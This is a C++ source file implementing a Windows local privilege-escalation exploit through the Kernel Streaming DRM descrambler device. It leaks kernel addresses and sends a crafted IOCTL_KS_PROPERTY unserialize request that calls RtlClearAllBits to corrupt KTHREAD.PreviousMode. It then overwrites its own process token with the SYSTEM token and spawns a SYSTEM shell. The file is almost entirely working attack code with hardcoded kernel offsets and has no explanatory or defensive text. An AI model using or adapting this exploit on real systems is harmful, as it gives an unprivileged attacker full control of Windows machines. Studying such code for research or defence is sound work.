#define __STREAMS__
#define _INC_MMREG
#include <Windows.h>
#include <winternl.h>
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#include <strmif.h>
#include <ks.h>
#include <ksproxy.h>
#include <ksmedia.h>
#include <SetupAPI.h>
#include <functiondiscovery.h>
#include <mmdeviceapi.h>
#include <stdint.h>
#include <safeint.h>
#include <TlHelp32.h>
#include <winsvc.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <psapi.h>
#include "headers.h"

#pragma comment(lib, "ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdllp.lib")
#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "Advapi32.lib")

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define SystemHandleInformation ((SYSTEM_INFORMATION_CLASS)16)

DWORD64 ntoskrnl_base = 0;
#define Offset_RtlClearAllBits 0x0036a040
#define Offset_PreviousMode 0x232
#define Offset_Token 0x4b8

typedef struct _FUNC_PAYLOAD {
    CHAR Padding[0x20];
    DWORD64 FuncPtr;
} FUNC_PAYLOAD;

typedef struct _BITMAP_PAYLOAD {
    PRTL_BITMAP FakeBitmap;
} BITMAP_PAYLOAD;

DWORD64 GetBaseAddr(LPCWSTR name)
{
    BOOL status;
    LPVOID* pImageBase;
    DWORD ImageSize;
    WCHAR driverName[1024];
    DWORD64 driverBase = 0;

    status = EnumDeviceDrivers(nullptr, 0, &ImageSize);

    pImageBase = (LPVOID*)VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    status = EnumDeviceDrivers(pImageBase, ImageSize, &ImageSize);

    int driver_count = ImageSize / sizeof(pImageBase[0]);

    for (int i = 0; i < driver_count; i++) {
        GetDeviceDriverBaseNameW(pImageBase[i], driverName, sizeof(driverName) / sizeof(char));

        if (!wcscmp(name, driverName)) {
            driverBase = (DWORD64)pImageBase[i];
            break;
        }
    }

    return driverBase;
}

PVOID FindObject(int pid, HANDLE dHandle) {

    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        printf("[-] Unable to find ntdll!NtQuerySystemInformation\n");
        return FALSE;
    }

    ULONG returnLen = 0x1000;
    NTSTATUS status;

    PSYSTEM_HANDLE_INFORMATION SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLen);

    do {
        if (SystemHandleInfo) {
            HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
        }

        SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLen);
        if (!SystemHandleInfo) {
            printf("[-] HeapAlloc Failed With Error: %d\n", GetLastError());
            return FALSE;
        }

        status = NtQuerySystemInformation(SystemHandleInformation, SystemHandleInfo, returnLen, &returnLen);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    PVOID dKTHREAD = NULL;
    for (ULONG i = 0; i < SystemHandleInfo->NumberOfHandles; i++)
    {
        if (SystemHandleInfo->Handles[i].UniqueProcessId == pid)
        {
            if (dHandle == (HANDLE)SystemHandleInfo->Handles[i].HandleValue)
            {
                dKTHREAD = SystemHandleInfo->Handles[i].Object;
                free(SystemHandleInfo);
                break;
            }
        }
    }
    // HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
    return dKTHREAD;
}

int main()
{
    // Step 1
    HANDLE hDevice = NULL;
    HRESULT hr = KsOpenDefaultDevice(
        KSCATEGORY_DRM_DESCRAMBLE,
        GENERIC_READ | GENERIC_WRITE,
        &hDevice
    );

    if (hDevice == NULL) {
        printf("[-] KsOpenDefaultDevice failed (HRESULT: 0x%X)\n", hr);
        return 1;
    }

    printf("[+] Successfully opened DRM descrambler device!\n");

    // Step 2

    ntoskrnl_base = GetBaseAddr(L"ntoskrnl.exe");
    printf("[+] NT base address %llx\n", ntoskrnl_base);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    PVOID curEPROCESS = FindObject(GetCurrentProcessId(), hProcess);

    if (curEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the current process!\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the current process %p\n", curEPROCESS);

    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    PVOID curKTHREAD = FindObject(GetCurrentProcessId(), hThread);

    if (curKTHREAD == NULL) {
        printf("[-] Unable to find KTHREAD of the current thread!\n");
        return 1;
    }

    printf("[+] Found KTHREAD of the current thread %p\n", curKTHREAD);

    PVOID sysEPROCESS = FindObject(4, HANDLE(0x4));

    if (sysEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the system.exe\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the system.exe %p\n", sysEPROCESS);

    // Step 3

    /// InBuffer
    char InBuffer[sizeof(KSPROPERTY) + sizeof(FUNC_PAYLOAD)] = { 0 };
    KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;
    FUNC_PAYLOAD* pInBufPayload = (FUNC_PAYLOAD*)((BYTE*)pInBufProperty + sizeof(KSPROPERTY));
    pInBufPayload->FuncPtr = ntoskrnl_base + Offset_RtlClearAllBits;

    /// OutBuffer
    UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(BITMAP_PAYLOAD)] = { 0 };
    
    KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)UnserializePropertySetRequest;
    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 0x1;

    KSPROPERTY_SERIAL* pSerial = (KSPROPERTY_SERIAL*)((BYTE*)pSerialHdr + sizeof(KSPROPERTY_SERIALHDR));
    pSerial->PropertyLength = sizeof(BITMAP_PAYLOAD);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id = 0x45;

    PVOID pFakeBitmapAddr = VirtualAlloc(PVOID(0x10000000), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pFakeBitmapAddr) {
        printf("[-] VirtualAlloc failed (%d)\n", GetLastError());
        return 1;
    }
    printf("[+] pFakeBitmapAddr = 0x%p\n", pFakeBitmapAddr);

    BITMAP_PAYLOAD* pFakeBit = (BITMAP_PAYLOAD*)((BYTE*)pSerialHdr + sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL));

    pFakeBit->FakeBitmap = (RTL_BITMAP*)pFakeBitmapAddr;
    pFakeBit->FakeBitmap->SizeOfBitMap = 0x8;
    pFakeBit->FakeBitmap->Buffer = (PVOID)((DWORD64)curKTHREAD + Offset_PreviousMode);

    // Step 4

    printf("[+] Calling Kernel Streaming....\n");
    NTSTATUS success = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        pInBufProperty,
        sizeof(InBuffer),
        pSerialHdr,
        sizeof(UnserializePropertySetRequest),
        nullptr,
        nullptr);

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");

    if (!NtWriteVirtualMemory) {
        printf("[-] Unable to find ntdll!NtWriteVirtualMemory\n");
        return FALSE;
    }

    printf("[+] Stealing system's Token..\n");
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curEPROCESS + Offset_Token), PVOID((DWORD64)sysEPROCESS + Offset_Token), 0x8, NULL);
    KPROCESSOR_MODE mode = UserMode;

    printf("[+] Replacing KTHREAD.PreviousMode as UserMode..\n");
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curKTHREAD + Offset_PreviousMode), &mode, sizeof(mode), NULL);
    
    printf("[+] Spawning shell as SYSTEM...\n");
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}